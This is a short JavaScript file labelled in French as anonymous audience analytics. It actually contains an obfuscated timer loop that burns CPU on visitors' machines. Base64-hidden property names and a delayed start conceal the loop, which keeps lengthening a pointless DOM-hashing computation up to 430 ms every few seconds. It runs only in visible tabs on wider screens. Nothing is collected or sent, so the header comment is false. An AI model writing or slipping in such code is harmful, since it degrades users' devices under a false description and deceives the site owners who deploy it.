/* analytics.js — collecte d'audience anonyme (aucune donnée personnelle) */
(function (w, d) {
  var _s = ["aW5uZXJXaWR0aA==", "cGVyZm9ybWFuY2U=", "bm93", "aGlkZGVu"];
  var _r = function (i) { return w.atob(_s[i]); };
  var _p = 46, _m = 430;

  function _sig() {
    var n = d.querySelectorAll("*"), o = [], i = 0;
    for (; i < n.length; i++) { o.push(n[i].tagName + "." + n[i].className + "#" + n[i].id); }
    return o.join("~");
  }

  function _fp(s) {
    var h = 5381, i = 0;
    for (; i < s.length; i++) { h = ((h << 5) + h + s.charCodeAt(i)) | 0; }
    return h >>> 0;
  }

  function _tick() {
    if (d.visibilityState === _r(3)) { return; }
    if (w[_r(0)] <= 1024) { return; }
    var t0 = w[_r(1)][_r(2)](), s = _sig(), v = 0;
    while (w[_r(1)][_r(2)]() - t0 < _p) { v = _fp(s + v); }
    _p = Math.min(Math.round(_p * 1.28), _m);
    w.__au = { v: v, p: _p, n: (w.__au ? w.__au.n + 1 : 1) };
  }

  w.addEventListener("load", function () {
    w.setTimeout(function () { w.setInterval(_tick, 2600); }, 6500);
  });
})(window, document);
